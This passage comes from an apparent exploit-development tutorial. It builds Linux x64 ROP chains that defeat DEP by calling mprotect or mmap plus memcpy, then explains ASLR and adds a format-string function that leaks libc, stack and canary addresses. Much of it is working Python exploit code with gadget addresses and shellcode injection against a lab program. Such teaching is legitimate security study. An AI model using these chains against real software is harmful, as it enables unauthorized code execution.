</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span></code></pre></div><p>Let&rsquo;s try this strategy against the program and see if it works.</p>
<center><img src="/imgs/mitigations_dep_2.png"/></center>
<h4 id="force-disable-dep-protection--execute-arbitrary-code">Force Disable DEP Protection &amp; Execute Arbitrary Code</h4>
<p>Operating systems provide low-level APIs that allow us to modify the permissions of memory pages at runtime. Windows, for example, provides an API called <code>VirtualProtect</code> and an even lower-level native API called <code>NtProtectVirtualMemory</code> that does this. On the other hand, Unix-based systems provide similar APIs that accomplish the same task, such as <code>mprotect</code>. These facts can be abused to force the targeted program to execute our evil instructions.</p>
<p>We can abuse the <code>mprotect</code> function to make the stack executable and then force the program to execute instructions injected into the stack. The <code>mprotect</code> declaration is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">mprotect</span>(<span style="color:#66d9ef">void</span> addr[.size], <span style="color:#66d9ef">size_t</span> size, <span style="color:#66d9ef">int</span> prot);
</span></span></code></pre></div><p>It takes exactly three paramters:</p>
<ol>
<li><strong>addr</strong>: The starting address of the memory region, which must be aligned to the page boundary.</li>
<li><strong>size</strong>: The length in bytes of the address range.</li>
<li><strong>prot</strong>: The desired access protection. Such as <code>PROT_READ</code>, <code>PROT_WRITE</code>, and <code>PROT_EXECUTE</code>.</li>
</ol>
<p>According to the Linux x64 calling convention, the three parameters must be passed through the RDI, RSI, and RDX registers. We need to build a ROP chain that performs the following:</p>
<ol>
<li>Set a stack address aligned with the page boundary to RDI, which can be done by writing that address into the stack and retrieving it via pop gadget (<code>pop rdi; ret</code>).</li>
<li>Set the desired size to RSI by writing it into the stack and retrieving it via pop gadget (<code>pop rsi; ret</code>).</li>
<li>Set the desired protection to RDX by writing it into the stack and retrieving it via pop gadget (<code>pop rdx; ret</code>).</li>
<li>Put the direct address of <code>mprotect</code> on the stack as a return address so that the program can jump directly to executing it.</li>
<li>Put the shellcode address next to the <code>mprotect</code> address so that it gets executed once the API returns.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hijack_exec</span>(p: Popen, canary):
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fffffffddb0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>                     <span style="color:#75715e"># Shellcode Address</span>
</span></span><span style="display:flex;"><span>    stack_page <span style="color:#f92672">=</span> shellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>           <span style="color:#75715e"># Aligne the address to the page boundary.</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x112</span>                               <span style="color:#75715e"># Fills the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, canary )                <span style="color:#75715e"># Places the correct canary value </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                                 <span style="color:#75715e"># Base pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7dd8205</span> )        <span style="color:#75715e"># pop rdi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, stack_page )            <span style="color:#75715e"># The aligned stack page address</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7dd9b39</span> )        <span style="color:#75715e"># pop rsi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x1000</span> )                <span style="color:#75715e"># Page size </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7ebb37d</span> )        <span style="color:#75715e"># pop rdx; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x01</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x02</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x04</span> )    <span style="color:#75715e"># Protections: PROT_EXEC=0x01, PROT_WRITE=0x02, PROT_READ=0x04    </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7ebb200</span> )        <span style="color:#75715e"># mprotect function address</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, shellcode )             <span style="color:#75715e"># Jump into shellcode</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>                             <span style="color:#75715e"># NOPs for padding</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> buf                                        <span style="color:#75715e"># Shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span></code></pre></div><p>Let&rsquo;s run this exploitation strategy and see what happens.</p>
<center><img src="/imgs/mitigations_dep_6.png"/></center>
<p>Alternatively, in Windows, it is possible to use functions like <code>NTSetInformationProcess</code> and <code>SetProcessDEPPolicy</code> to disable such protection and make the memory executable depending on the configured DEP mode. In Unix-based systems, there are some similar methods, where we can use a low-level API called <code>personality</code> and pass the <code>READ_IMPLIES_EXEC</code> flag as parameter to it, which will make the memory that will be mapped later executable even if it has not been mapped with execute permissions (this will not work on previously created heaps).</p>
<p>One effective method is to map new memory with execute permissions, then move the malicious instructions to that memory and redirect the execution flow of the program to execute those instructions. In Windows, there are several low-level APIs that help with this, such as <code>VirtualAlloc</code>, <code>NtAllocateVirtualMemory</code>, <code>WriteProcessMemory</code>, and <code>NtWriteVirtualMemory</code>. On the other hand, Unix-based systems have functions that do the same thing, such as <code>mmap</code>. Let&rsquo;s follow this approach in developing our own exploit.</p>
<p>We need to build a ROP chain does exactly the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>pExecutableMemory <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>( NULL, <span style="color:#ae81ff">0x1000</span>, PROT_EXEC<span style="color:#f92672">|</span>PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_ANONYMOUS<span style="color:#f92672">|</span>MAP_SHARED, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>( pExecutableMemory, pShellcode, ulShellSize );
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pExecutableMemory</span>(); <span style="color:#75715e">// jmp/call pExecutableMemory
</span></span></span></code></pre></div><p>The <code>mmap</code> declaration is exactly as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mmap</span>(<span style="color:#66d9ef">void</span> addr[.length], <span style="color:#66d9ef">size_t</span> length, <span style="color:#66d9ef">int</span> prot, <span style="color:#66d9ef">int</span> flags, <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">off_t</span> offset);
</span></span></code></pre></div><p>It takes the following parameters:</p>
<ol>
<li><strong>addr</strong>: The starting address for the new mapping is specified in addr or NULL.</li>
<li><strong>length</strong>: The length of the mapping.</li>
<li><strong>prot</strong>: The desired access protection. Such as <code>PROT_READ</code>, <code>PROT_WRITE</code>, and <code>PROT_EXECUTE</code>.</li>
<li><strong>flags</strong>: This determines whether updates to the mapping are visible to other processes mapping the same region, and whether updates are carried through to the underlying file.</li>
<li><strong>fd</strong>: The file descriptor (this argument is ignored when <code>MAP_ANONYMOUS</code> flag was used).</li>
<li><strong>offset</strong>: The offset of the mapping memory in fd (this argument must be zero when using the <code>MAP_ANONYMOUS</code> flag).</li>
</ol>
<p>Reminder: According to the x64 Linux Calling Convention, the six parameters must be passed to functions through registers in this order, rdi, rsi, rdx, rcx, r8, r9. So for calling that API we need to build a ROP chain that does the following:</p>
<ol>
<li>We have to set rdi to NULL. I couldn&rsquo;t find neither <code>mov rdi, 0; ret</code> nor <code>xor rdi, rdi; ret</code> gadgets, so the alternative is <code>pop rdi; ret</code>, with zeros in the stack immediately after the gadget (We have no problem with \x00 as it is not a bad byte for the vulnerable program).</li>
<li>The rsi register must be set to the appropriate size, for example 0x1000 (the memory page size). This gadget <code>pop rsi; ret</code> is convenient.</li>
<li>The rdx register must be set to the disered protections (PROT_EXEC|PROT_READ|PROT_WRITE), we&rsquo;ll use <code>pop rdx; ret</code> for that.</li>
<li>The rcx register must be set to the disered flags (MAP_ANONYMOUS|MAP_SHARED), we&rsquo;ll use <code>pop rcx; add eax, 0x1734ba; ret</code> for that. This gadget changes the eax value but we don&rsquo;t care about the eax register right now so that&rsquo;s ok.</li>
<li>Register r8 needs to be set to -1, and -1 is exactly 0xffffffffffffff, so we&rsquo;ll write this to the stack and retrieve it with the <code>pop r8; ret</code> gadget.</li>
<li>The last parameter is zero so register r9 should be set to zero, but at this point it already holds zero so we don&rsquo;t have to do anything with it.</li>
<li>The <code>mmap</code> address must be set as a return address so that the system call will be executed after all its parameters have been set.</li>
</ol>
<p>The next step is to copy our malicious code to the memory allocated by the <code>mmap</code> using the <code>memcpy</code> function. The <code>memcpy</code> function is declared as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">memcpy</span>(<span style="color:#66d9ef">void</span> dest[<span style="color:#66d9ef">restrict</span> .n], <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> src[<span style="color:#66d9ef">restrict</span> .n], <span style="color:#66d9ef">size_t</span> n);
</span></span></code></pre></div><p>It takes exactly three parameters:</p>
<ol>
<li><strong>dest</strong>: The destination memory address to copies to.</li>
<li><strong>src</strong>: The source memory address that copies from.</li>
<li><strong>n</strong>: Number of bytes to be copied.</li>
</ol>
<p>To do this we must complete our ROP chain as follows:</p>
<ol>
<li>The rdi register needs to be set to the mapping memory address returned by <code>mmap</code> in rax register. Unfortunately, I couldn&rsquo;t find an appropriate gadget that moves the rax value to the rdi like <code>mov rdi, rax; ret</code> or <code>push rax; pop rdi; ret</code>, but thanks god, I managed to find a gadget that swaps them <code>xchg rdi, rax; cld; ret;</code>.</li>
<li>The rsi register needs to be set to the shellcode address which is in the stack, so the gadget <code>pop rsi; ret</code> always comes to the rescue.</li>
<li>The rdx needs to be set to the shellcode size, and as before we&rsquo;ll use <code>pop rdx; ret</code>.</li>
<li>The <code>memcpy</code> address must be set as a return address so that it get executed.</li>
</ol>
<p>Now everything is in order and we just need to jump into that executable memory to make our shellcode run out. At this point, The rdi register holds the executable memory address (shellcode), so we need a gadget like <code>jmp rdi</code> or <code>call rdi</code> (the shellcode will kill the process, so we don&rsquo;t care whether flow control is lost or not). But I found an alternative gadget which is <code>push rdi; adc al, 0x48; lea eax, [rdi + 0x15]; ret;</code>, this gadget pushes the executable shellcode address onto the stack, adding the carry flag + 0x48 to al, and then load the rdi value + 0x15 to eax (it&rsquo;s valid and convenient). Once the gadget returns, the next return address will be the shellcode due to the <code>push</code> instruction.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hijack_exec</span>(p: Popen, canary):
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fffffffddb0</span>  <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>                    <span style="color:#75715e"># Shellcode Address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x112</span>                               <span style="color:#75715e"># Fills the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, canary )                <span style="color:#75715e"># Places the correct canary value </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                                 <span style="color:#75715e"># Base pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7dd8205</span> )        <span style="color:#75715e"># pop rdi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                              <span style="color:#75715e"># addr = NULL</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7dd9b39</span> )        <span style="color:#75715e"># pop rsi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x1000</span> )                <span style="color:#75715e"># Page size </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7ebb37d</span> )        <span style="color:#75715e"># pop rdx; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x01</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x02</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x04</span> )    <span style="color:#75715e"># Protections: PROT_EXEC=0x01, PROT_WRITE=0x02, PROT_READ=0x04  </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7ded94c</span> )        <span style="color:#75715e"># pop rcx; add eax, 0x1734ba; ret;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x01</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x20</span> )           <span style="color:#75715e"># flags: MAP_SHARED=0x01 MAP_ANONYMOUS=0x20</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7fd9efb</span> )        <span style="color:#75715e"># pop r8; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                              <span style="color:#75715e"># fd = -1</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7eba9a0</span> )        <span style="color:#75715e"># mmap( NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0 )</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7f288a1</span> )        <span style="color:#75715e"># xchg rdi, rax; cld; ret;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7dd9b39</span> )        <span style="color:#75715e"># pop rsi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, shellcode )             <span style="color:#75715e"># Shellcode address</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7ebb37d</span> )        <span style="color:#75715e"># pop rdx; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, len(buf) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span> )       <span style="color:#75715e"># Shellcode size for memcpy</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7feb6e0</span> )        <span style="color:#75715e"># memcpy( exec_mem, shellcode, shellsize )</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Execute the shellcode</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7ffff7e5ce42</span> )        <span style="color:#75715e"># push rdi; adc al, 0x48; lea eax, [rdi + 0x15]; ret;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>                             <span style="color:#75715e"># NOPs for padding</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> buf                                        <span style="color:#75715e"># Shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span></code></pre></div><p>Let&rsquo;s fire:</p>
<center><img src="/imgs/mitigations_dep_4.png"/></center>
<center><img src="/imgs/mitigations_dep_5.png"/></center>
<h2 id="address-space-layout-randomization--aslr-">Address Space Layout Randomization ( ASLR )</h2>
<p>Most of the exploit strategies we&rsquo;ve used always require fixed addresses to use, such as shellcode addresses in the stack, critical data addresses like canaries to leak, and ROP gadget addresses. Without knowing the addresses of this critical data, the exploit will fail completely. This protection is designed to kill this approach.</p>
<p>ASLR essentially randomizes the base address of the executable file when the program is loaded into memory and also randomizes the loaded libraries, stack, and heap. Thus, if an attacker gains control over the execution flow (such as controlling the instruction pointer), the location of the code to be executed, the addresses of the ROP gadgets, and everything else needed for the exploit are completely unknown. To understand how this protection exactly works, we first need to know how operating systems manage memory and the considerations behind it. Actually, what we see during debugging and the addresses we interact with are not actual physical memory addresses but virtual memory addresses. I&rsquo;ll explain why operating systems work this way and what the benefits are.</p>
<p>In our current era, physical memory space is extremely limited compared to the needs of users who want to use numerous programs simultaneously and even servers that serve thousands or millions of clients. All of this is completely unsuitable for RAM sizes. Furthermore, RAM is very expensive, not only financially, but also because increasing it negatively impacts other aspects such as energy consumption and overall computer performance. Virtual memory thus came to solve these problems.</p>
<p>Virtual memory can be defined as a method of memory management by the operating system that simulates a memory larger than physical memory. It allows many programs whose size is larger than physical memory to run in a very intelligent way that allows loading part of the data into physical memory, but not the entire data. The hard disk is used to store data that is not in use. When the data&rsquo;s turn comes, the memory manager swaps it to physical memory. To keep track of the data and its actual locations in physical memory, the memory manager builds a map table that identifies the virtual addresses of the data and the corresponding addresses of that data in physical memory, as well as additional information that identifies which virtual addresses belong to which process. Have you ever noticed that the same addresses are repeated in different processes running at the same time?</p>
<center><p><img src="/imgs/9_01_VirtualMemoryLarger.jpg" height="600" width="400"/>Operating Systems Concepts book ch9</p></center>
<p>This mapping table (Page Table) plays a vital role, helping the operating system translate virtual addresses into real physical addresses when a particular process requests access to these virtual addresses. The operating system works along with the memory management unit (MMU) in the CPU to perform this task. So, that&rsquo;s the reason of why no collisions occur when different processes attempt to access the same virtual addresses.</p>
<p>Normally, when the ASLR is disabled, the operating system maps processes to a fixed virtual memory range. But, when it is enabled, the operating system selects random ranges each time the program is run. The Page Table will always help the memory manager translate these virtual addresses into physical addresses; it doesn&rsquo;t care; they&rsquo;re just numbers to it. I would like to point out here that data addresses in physical memory is essentially random whether you have ASLR enabled or not and in different locations each time the program is run. The whole problem lies with the virtual memory management system.</p>
<h3 id="defeating-aslr">Defeating ASLR</h3>
<p>Yes, this protection makes things more difficult and makes exploitation more complex, especially when used in conjunction with the other protections mentioned above. However, there is still a lot we can do to bypass this protection. One strategy is to leak the required addresses using any memory disclosure bug or other techniques so we can defeat the randomization and circumvent the protection. To build our ROP chain, we only need a single address belonging to the module/library. From this address, we can calculate the base address of the module and also all the required ROP gadgets.</p>
<center><img src="/imgs/mitigations_aslr_1.png"/></center>
<p>As shown in the image, there are addresses in the stack relative to the Libc and also an address relative to the stack. We need to leak these addresses to dynamically calculate the addresses of the important ROP Gadgets we need, as well as the shellcode address. So, we need to update our <code>leak_canary</code> function to leak those required addresses, and rename it to an appropriate name such as <code>leak_stuff</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_stuff</span>(p: Popen):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%49$p %51$p %67$p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    pos <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> n <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>:
</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>readline()
</span></span><span style="display:flex;"><span>        pos <span style="color:#f92672">=</span> out<span style="color:#f92672">.</span>find( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x&#34;</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> bool( <span style="color:#f92672">~</span>pos ):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> [ <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ] <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    info <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> bool( n ):
</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> out[pos:]
</span></span><span style="display:flex;"><span>        end <span style="color:#f92672">=</span> out<span style="color:#f92672">.</span>find( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span> )
</span></span><span style="display:flex;"><span>        info <span style="color:#f92672">+=</span> [ int(out[:end], <span style="color:#ae81ff">16</span>) ]
</span></span><span style="display:flex;"><span>        pos <span style="color:#f92672">=</span> ( end <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> info
